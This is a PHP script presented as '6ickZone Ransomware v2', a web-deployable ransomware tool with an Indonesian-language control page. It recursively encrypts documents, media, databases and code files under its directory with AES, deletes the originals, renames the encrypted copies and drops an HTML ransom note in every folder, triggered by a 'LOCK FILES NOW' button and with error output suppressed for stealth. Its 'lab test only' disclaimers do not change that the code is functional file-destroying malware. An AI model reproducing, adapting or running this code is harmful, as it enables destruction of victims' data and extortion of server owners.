<?php
// 6ickZone Ransomware v2 - Upgrade Version
// Encrypt all target files, generate random IV, change file extension, and drop ransom note.
// by 0x6ick (Upgraded by Nyx6st)

set_time_limit(0); // Allow script to run indefinitely
error_reporting(0); // Suppress all PHP errors for stealth

// --- Configuration ---
$key = "6ickZoneRansomKeyForLabTestOnly!@#"; // Your encryption key (KEEP THIS SAFE!)
$new_extension = ".6ick"; // New extension for encrypted files
$ransom_note_filename = "!!!DECRYPT_ME!!!.html"; // Name of the ransom note file

// List of files/folders to EXCLUDE from encryption
// Add important system files, database files, logs, or your own scripts here.
$exclude_list = [
    basename(__FILE__), // This script itself (encrypt.php)
    'decrypt.php',      // Your decryption script (if you create one)
    $ransom_note_filename, // The ransom note itself
    '.htaccess',        // Apache web server configuration file
    '.user.ini',        // PHP user configuration file
    'web.config',       // IIS web server configuration file
    'php.ini',          // PHP configuration file
    'index.php',        // Often main entry point, might want to exclude
    'error_log',        // Server error logs
    'access_log',       // Server access logs
    'logs',             // Common log directory
    '.git',             // Git repository files
    '.vscode',          // VS Code configuration files
    'vendor',           // Composer dependencies (often large)
    'node_modules',     // Node.js dependencies (often large)
    'composer.json',    // Composer configuration
    'package.json',     // Node.js package configuration
    // Add more specific files/folders based on your server setup
];

// List of file extensions to TARGET for encryption
// If empty, it will encrypt ALL files (except excluded ones).
// For more realistic ransomware, specify common document/media/database extensions.
$target_extensions = [
    'txt', 'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', 'pdf', 'jpg', 'jpeg', 'png', 'gif',
    'mp3', 'mp4', 'avi', 'mov', 'zip', 'rar', '7z', 'sql', 'db', 'mdb', 'accdb', 'psd', 'ai',
    'html', 'htm', 'php', 'js', 'css', 'json', 'xml', 'csv',
    // Add other relevant extensions you want to target in your lab
];

// --- Global Variables ---
$encryptedFilesCount = 0;
$operation_status = false; // To track if encryption was attempted

// --- Encryption Function ---
function encryptFile($filePath, $encryptionKey, $newExtension) {
    global $key, $new_extension, $encryptedFilesCount;

    $data = file_get_contents($filePath);
    if ($data === false) return false;

    // Check if file is already encrypted by our header
    // Use OPENSSL_RAW_DATA for direct binary output
    $header_len = strlen("6ickZone:");
    if (substr($data, 0, $header_len) === "6ickZone:") {
        return false; // Already encrypted, skip
    }

    // Generate a secure, random IV (Initialization Vector)
    // IV MUST be unique for each encryption to be cryptographically secure
    $iv = openssl_random_pseudo_bytes(16); // AES-128 needs a 16-byte IV

    // Encrypt the data
    $encryptedData = openssl_encrypt($data, 'AES-128-CBC', $encryptionKey, OPENSSL_RAW_DATA, $iv);
    if ($encryptedData === false) return false;

    // Prepend the IV to the encrypted data, then add our custom header and base64 encode
    // The IV is needed for decryption, so it must be stored with the encrypted data
    $finalData = "6ickZone:" . base64_encode($iv . $encryptedData);

    // Save the encrypted data to a new file (original_filename.ext.6ick)
    if (file_put_contents($filePath . $new_extension, $finalData) === false) {
        return false;
    }

    // Delete the original file
    if (!unlink($filePath)) {
        // If deletion fails, consider rolling back or logging
        // For simulation, we can just note it.
        return false;
    }

    $encryptedFilesCount++;
    return true;
}

// --- Ransom Note Function ---
function dropRansomNote($directory, $encryptionKey, $noteFilename) {
    $note_content = "
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>!!! FILES ENCRYPTED !!!</title>
    <style>
        body { font-family: 'Courier New', monospace; background-color: #000; color: #0f0; text-align: center; padding: 50px; }
        h1 { color: #f00; }
        p { margin: 20px 0; }
        code { background-color: #333; padding: 2px 5px; border-radius: 3px; }
        .key-info { border: 1px solid #0f0; padding: 15px; display: inline-block; margin-top: 30px; }
    </style>
</head>
<body>
    <h1>!!! ALL YOUR FILES HAVE BEEN ENCRYPTED BY 6ickZone RANSOMWARE !!!</h1>
    <p>Your important documents, photos, databases, and other files are now inaccessible.</p>
    <p>To restore your data, you need the decryption key.</p>
    <div class='key-info'>
        <p>Your Decryption Key (FOR LAB TEST ONLY):</p>
        <code>" . htmlspecialchars($encryptionKey) . "</code>
        <p><strong>DO NOT SHARE THIS KEY.</strong></p>
    </div>
    <p>Contact us at 6ickwhispers@gmail.com for further instructions (simulated contact).</p>
    <p>Warning: Attempting to decrypt without the correct key may corrupt your files permanently.</p>
    <p>This is a simulated ransomware for educational purposes by 0x6ick.</p>
</body>
</html>
";
    file_put_contents($directory . DIRECTORY_SEPARATOR . $noteFilename, $note_content);
}


// --- Recursive Scan and Encrypt Function ---
function scanAndEncryptRecursive($dir, $encryptionKey, $excludeList, $targetExtensions, $newExtension, $ransomNoteFilename) {
    global $encryptedFilesCount;

    // Drop ransom note in the current directory
    dropRansomNote($dir, $encryptionKey, $ransomNoteFilename);

    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue; // Skip current and parent directory entries

        $path = $dir . DIRECTORY_SEPARATOR . $item;

        // Check if item is in the exclude list
        if (in_array($item, $excludeList)) {
            continue;
        }

        if (is_dir($path)) {
            scanAndEncryptRecursive($path, $encryptionKey, $excludeList, $targetExtensions, $newExtension, $ransomNoteFilename);
        } elseif (is_file($path)) {
            // Check if file already has the new extension (already encrypted)
            if (pathinfo($path, PATHINFO_EXTENSION) === trim($newExtension, '.')) {
                continue;
            }

            // Check if file extension is in target list (if targetExtensions is not empty)
            if (!empty($targetExtensions)) {
                $file_ext = pathinfo($path, PATHINFO_EXTENSION);
                if (!in_array($file_ext, $targetExtensions)) {
                    continue; // Skip if extension is not targeted
                }
            }

            encryptFile($path, $encryptionKey, $newExtension);
        }
    }
}

// --- Main Execution Logic ---
if (isset($_POST['lock'])) {
    $rootDir = __DIR__; // Target directory (current directory of this script)
    $operation_status = true;
    scanAndEncryptRecursive($rootDir, $key, $exclude_list, $target_extensions, $new_extension, $ransom_note_filename);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>6ickZone Ransomware2</title>
    <style>
        body { background:#0d0d0d; color:#eee; font-family: 'Courier New', monospace; text-align:center; padding-top: 50px; }
        h1 { color:#f44336; }
        button { background:#f44336; border:none; padding:15px 30px; color:#fff; font-size:16px; cursor:pointer; border-radius:5px; }
        button:hover { background:#c62828; }
        .info { margin-top: 20px; font-size: 18px; }
        .footer { margin-top: 50px; font-size: 14px; color:#777; }
        code { background: #333; padding: 2px 6px; border-radius: 4px; }
        .warning { color: #ffeb3b; font-weight: bold; margin-bottom: 20px; }
        .key-display { background: #222; padding: 15px; border-radius: 8px; display: inline-block; margin-top: 20px;}
    </style>
</head>
<body>
    <h1>6ickZone Ransomware (v2)</h1>
    <p class="warning">
        PERINGATAN: INI ADALAH SIMULASI RANSOMWARE UNTUK TUJUAN PEMBELAJARAN.
        JANGAN PERNAH MENJALANKANNYA DI LINGKUNGAN PRODUKSI ATAU MESIN PENTING!
        PASTIKAN LAB SERVER ANDA SEPENUHNYA TERISOLASI.
    </p>

    <?php if (!$operation_status): ?>
        <p>Auto scan & encrypt semua file target di direktori ini dan subfolder-nya.</p>
        <form method="post">
            <button type="submit" name="lock">LOCK FILES NOW</button>
        </form>
    <?php else: ?>
        <div class="info">
            <p>Done! Total file terenkripsi: <strong><?= $encryptedFilesCount ?></strong></p>
            <p>File terenkripsi sekarang memiliki ekstensi <code><?= htmlspecialchars($new_extension) ?></code>.</p>
            <p>Cek setiap folder untuk menemukan file <code><?= htmlspecialchars($ransom_note_filename) ?></code>.</p>
            <div class="key-display">
                <p>Kunci untuk Dekripsi (CATAT BAIK-BAIK UNTUK DEKRIPSI):</p>
                <code><?= htmlspecialchars($key) ?></code>
            </div>
        </div>
    <?php endif; ?>

    <div class="footer">by 0x6ick - 6ickZone</div>
</body>
</html>
